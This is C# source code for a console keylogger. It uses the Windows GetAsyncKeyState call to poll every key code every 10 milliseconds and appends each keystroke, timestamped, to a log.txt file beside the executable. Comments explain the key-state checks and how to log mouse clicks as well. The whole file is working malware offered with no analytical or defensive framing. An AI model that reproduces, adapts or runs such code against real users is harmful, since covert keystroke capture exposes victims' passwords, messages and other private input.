namespace Console.Keylogger
{
    using System;
    using System.IO;
    using System.Reflection;
    using System.Runtime.InteropServices;
    using System.Threading;

    public class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static void Main(string[] args)
        {
            StartLogging();
        }

        static void StartLogging()
        {
            var exeDirectory = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
            var logFilePath = $"{exeDirectory}/log.txt";

            using (StreamWriter writer = new StreamWriter(logFilePath))
            {
                writer.AutoFlush = true;

                while (true)
                {
                    // Putting the process to sleep every 10 ms, 
                    // In order to prevent it from eating our CPU
                    Thread.Sleep(10);

                    for (Int32 i = 0; i < 255; i++)
                    {
                        var keyState = GetAsyncKeyState(i);

                        // If keyState == 1 -> the most insignificant bit is set to 1
                        // If keyState == -32767 -> the most significant bit is set to 1
                        // Both states mean that the key with number "i" has been pressed
                        if (keyState == 1 || keyState == -32767)
                        {
                            var key = (Keys)i;

                            // This check is done so that we don't log the mouse button clicks
                            // Remove this check if you want to get the mouse clicks also
                            if (key != Keys.LButton && key != Keys.RButton)
                            {
                                writer.WriteLine($"[{DateTime.Now}] - {key}");
                            }
                        }
                    }
                }
            }
        }
    }
}
